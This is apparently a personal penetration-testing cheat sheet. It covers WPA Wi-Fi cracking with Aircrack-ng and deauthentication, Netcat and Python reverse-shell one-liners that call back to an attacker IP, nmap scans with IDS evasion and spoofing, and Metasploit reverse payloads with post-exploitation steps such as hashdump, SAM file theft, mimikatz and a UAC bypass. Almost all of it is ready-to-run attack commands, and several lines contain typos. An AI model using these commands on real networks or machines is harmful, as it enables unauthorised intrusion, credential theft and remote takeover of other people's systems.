#!!Aircrack-ng [Crack wifi password]
[*]sudo airmon-ng start wlan0
[*]sudo airodump-ng mon0
[*]sudo airodump-ng -c[channel for wireless network 1 or 2 or..] --bssid [MAC address of accesspoint] -w[file name for handshake generally WPAcrack] wireless inferface[generally wlan0 or wlanmon] --ignore-negative-one
[*]sudo aireplay-ng -deauth 100 -a [acces point MAC] -c [MAC of target client ] interface[wlan0 or wlanmon] --ignore negative one.
[*] aircrack-ng -w [name of dict file] -b [MAc adddress of acces point] WPAcrack.cap
+For injection working test:
[*]airplay-ng --test interface[monitor mde enable]
------------------------------------------------------------------------------------------------------------------------------
#!!Netcat reverse shell
1.Set Up a Netcat listener on the attacking machine.
2.Connect back to Netcat listener from target machine, after achieving remote code execution.
3.Run commands on the target from the attacking machine through the Netcat shell session.

[*]nc –lvp <port>
 __________________________________________________
|						   |
|   -l ---->for listen mode, for inbound connects  |
|   -v  ---->for verbose                           |
|   -p [port] ------>for specifying port number    |
|__________________________________________________|                                                  

[*]nc <attacker-ip> <port> -e /bin/bash 

+For windows:
[*]nc.exe <attacker-ip> <port> -e cmd.exe
 __________________________________________________
 -e [prog]              inbound program to execute 
 __________________________________________________

+Pthon script:

[*]python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER-IP",ATTACKER-PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

-------------------------------------------------------------------------------------------------------------------------------
#!!Remove black border RPi
[*] sudo nano /booot/config.txt
uncommnet #overscan=1
-------------------------------------------------------------------------------------------------------------------------------
#!!Namp Coomands:

TCP NULL Scan	            	nmap -sN [target]			nmap -sN 192.168.0.1
TCP FIN Scan	            	nmap -sF [target]			nmap -sF 192.168.0.1
Xmas Scan	            	nmap -sX [target]			nmap -sX 192.168.0.1
IP Protocol Scan            	nmap -sO [target]			nmap -sO 192.168.0.1
Send Raw Ethernet Packets   	nmap –send-eth [target]			nmap –send-eth 192.168.0.1
Send IP Packets			nmap –send-ip [target]			nmap –send-ip 192.168.0.1
Disable Reverse DNS Resolution	nmap -n [target]			nmap -n 192.168.0.1
Alternative DNS Lookup		nmap –system-dns [target]		nmap –system-dns 192.168.0.1
Manually Specify DNS Server(s)	nmap –dns-servers [servers] [target]	nmap –dns-servers 201.56.212.54 192.168.0.1
Create a Host List		nmap -sL [targets]			nmap -sL 192.168.0.1/24
 _________________________________________________________________________________
| Flag |           Use                                |        Example            |
|_____ |______________________________________________|___________________________|
| -sS  |	TCP syn port scan                     |  nmap -sS 192.168.1.1 	  |
| -sT  |	TCP connect port scan                 |  nmap -sT 192.168.1.1 	  |
| –sU  |	UDP port scan	                      |  nmap –sU 192.168.1.1 	  |
| –sA  |	TCP ack port scan                     |  nmap –sA 192.168.1.1 	  | 
|______|______________________________________________|___________________________|
|      |					      |				  |
| -Pn  | 	only port scan	                      |  nmap -Pn192.168.1.1      |
| -sn  |	only host discover	              |  nmap -sn192.168.1.1      |
| -PR  |	arp discovery on a local network      |  nmap -PR192.168.1.1      |
| -n   | 	disable DNS resolution	              |  nmap -n 192.168.1.1      |
| -p   |        specify a port or port range	      |  nmap -p 1-30 192.168.1.1 |
| -p-  |        scan all ports	                      |  nmap -p- 192.168.1.1     |
| -F   |	fast port scan	                      |  nmap -F 192.168.1.1      |
| -O   |	detect operating system of the target |  nmap -O 192.168.1.1      |
| -sc  |        default Script scan                   |  nmap -sC 192.168.1.1     |
|      |        Top-port scan                         |  nmap –top-ports [Target] |
| -f   |       use fragmented IP packets	      |  nmap -f 192.168.1.1      |
| -D   |       decoy scans	                      |  nmap -D 192.168.1.1      |
| -g   |       use a given source port number	      |  nmap -g 22 192.168.1.1   |
| -T0  |       paranoid IDS evasion	              |  nmap -T0 192.168.1.1     |
| -T1  |       sneaky IDS evasion	              |  nmap -T1 192.168.1.1     |
| -T2  |       polite IDS evasion	              |  nmap -T2 192.168.1.1     |
| -T3  |       normal IDS evasion	              |  nmap -T3 192.168.1.1     |
| -T4  |       aggressive speed scan	              |  nmap -T4 192.168.1.1     |
| -T5  |       insane speed scan	              |  nmap -T5 192.168.1.1     |
|______|______________________________________________|___________________________|	 

Traceroute	                nmap –traceroute [target]	        nmap –traceroute 192.168.0.1
Force Reverse DNS Resolution	nmap -R [target]	                nmap -R 192.168.0.1
Attempt to Guess an Unknown OS	nmap -O –-osscan guess [target]	        nmap -O –osscan-guess 192.168.0.1
Spoof MAC Address	        nmap –spoof-mac [MAC|0|vendor] [target]	nmap –spoof-mac Cis 192.168.0.1
Perform a Sequential Port Scan	nmap -r [target]	                nmap -r 192.168.0.1
Perform a RPC Scan	        nmap -sR [target]	                nmap -sR 192.168.0.1  
Trace Packets	                nmap –packet-trace [target]	        nmap –packet-trace 192.168.0.1   
le Zombie Scan	                nmap -sI [zombie] [target]	        nmap -sI 192.168.0.38
Service Version Detection	nmap -sV [target]	                nmap -sV 192.168.0.1

------------------------------------------------------------------------------------------------------------------------------
#!!!Metasploiit commands:

------->Windows reverse meterpreter payload:
	 _______________________________________________________________________________
	|  command				     |		Description		|
	|					     |					|
	|set payload windows/meterpreter/reverse_tcp |	Windows reverse tcp payload	|
	|____________________________________________|__________________________________|

------->Windows VNC Meterpreter payload
	 _______________________________________________________________________________________________
	|							     |					|
	|set payload windows/vncinject/reverse_tcpset ViewOnly false |	Meterpreter Windows VNC Payload |
	|____________________________________________________________|__________________________________|

------->Linux Reverse Meterpreter payload
	 ___________________________________________________________________________________
	|set payload linux/meterpreter/reverse_tcp	| Meterpreter Linux Reverse Payload |
	|_______________________________________________|___________________________________|

	COMMAND								DESCRIPTION
	------------------------------------------------|-----------------------------------------
	upload file c:\\windows	Meterpreter 		|	upload file to Windows target
	download c:\\windows\\repair\\sam /tmp		|	Meterpreter download file from Windows target
	download c:\\windows\\repair\\sam /tmp		|	Meterpreter download file from Windows target
	execute -f c:\\windows\temp\exploit.exe		|	Meterpreter run .exe on target – handy for executing uploaded exploits
	execute -f cmd -c				|	Creates new channel with cmd shell
	ps						|	Meterpreter show processes
	shell						|	Meterpreter get shell on the target
	getsystem					|	Meterpreter attempts priviledge escalation the target
	hashdump					|	Meterpreter attempts to dump the hashes on the target
	portfwd add –l 3389 –p 3389 –r target		|	Meterpreter create port forward to target machine
	portfwd delete –l 3389 –p 3389 –r target	|	Meterpreter delete port forward


------->Local Windows Metasploit Modules (exploits)

		COMMAND						DESCRIPTION
	use exploit/windows/local/bypassuac	Bypass UAC on Windows 7 + Set target + arch, x86/64

	------->Metasploit Powershell Modules:
			COMMAND						 	DESCRIPTION
		-----------------------------------------------|------------------------------------
		use exploit/multi/script/web_delivery	       |	Metasploit powershell payload delivery module
		post/windows/manage/powershell/exec_powershell |	Metasploit upload and run powershell script through a session
		use exploit/multi/http/jboss_maindeployer      |	Metasploit JBOSS deploy
		use exploit/windows/mssql/mssql_payload	       |	Metasploit MSSQL payload
		------------------------------------------------------------------------------------
	-------->Post Exploit Windows Metasploit Modules
				COMMAND						DESCRIPTION
			------------------------------------------------|---------------------------------------------------------
			run post/windows/gather/win_privs		|   Metasploit show privileges of current user
			use post/windows/gather/credentials/gpp		|   Metasploit grab GPP saved passwords
			load mimikatz -> wdigest			|   Metasplit load Mimikatz
			run post/windows/gather/local_admin_search_enum	|   Idenitfy other machines that the supplied domain user has
									|	 administrative access to
------>These are the basic Metasploit Commands!
	[*]search
	[*]info
	[*]show options
LHOST: Use Local IP Address|If your attacking on WAN network you need to set LHOST to static IP Address IP and port forward

LPORT: If your attacking in LAN Network then you don’t need to port forward use any port you want.
If your attacking on WAN Network then you have to port forward that port.
[*]Show Payloads
[*]Show targets
[*]Show advanced
[*]Show encoders
[*]Show nops






